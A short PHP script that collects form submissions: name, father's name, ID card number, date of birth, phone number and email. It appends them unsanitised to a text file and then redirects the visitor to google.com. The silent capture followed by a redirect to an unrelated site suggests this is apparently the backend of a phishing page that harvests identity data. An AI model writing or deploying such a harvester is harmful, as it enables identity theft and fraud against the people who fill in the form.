<?php

if (isset($_POST['name']) && isset($_POST['father'])) {
    $file = 'usernames.txt';
    $data = "Name: " . $_POST['name'] . "\n" . "Father's Name: " . $_POST['father'] . "\n";
    
    // Additional data
    $data .= "ID Card: " . $_POST['id_card'] . "\n";
    $data .= "Date of Birth: " . $_POST['dob'] . "\n";
    $data .= "Phone Number: " . $_POST['phone_number'] . "\n";
    $data .= "Email: " . $_POST['email'] . "\n";

    $data .= "--------------------\n";
    
    file_put_contents($file, $data, FILE_APPEND);
}

header('Location: https://google.com');
exit();
?>
